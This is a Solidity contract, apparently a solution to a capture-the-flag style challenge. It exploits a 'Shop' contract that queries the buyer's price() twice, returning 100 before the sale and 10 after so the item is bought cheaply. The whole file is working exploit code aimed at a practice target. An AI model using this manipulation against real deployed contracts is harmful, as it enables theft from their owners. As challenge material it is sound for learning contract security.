// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract ShopAttack {
  IShop public shop;

  constructor(address challenge) {
    shop = IShop(challenge);
  }

  function price() external view returns (uint) {
    if (!shop.isSold()) {
      return 100;
    } else {
      return 10;
    }
  }

  function attack() public {
    shop.buy();
  }
}
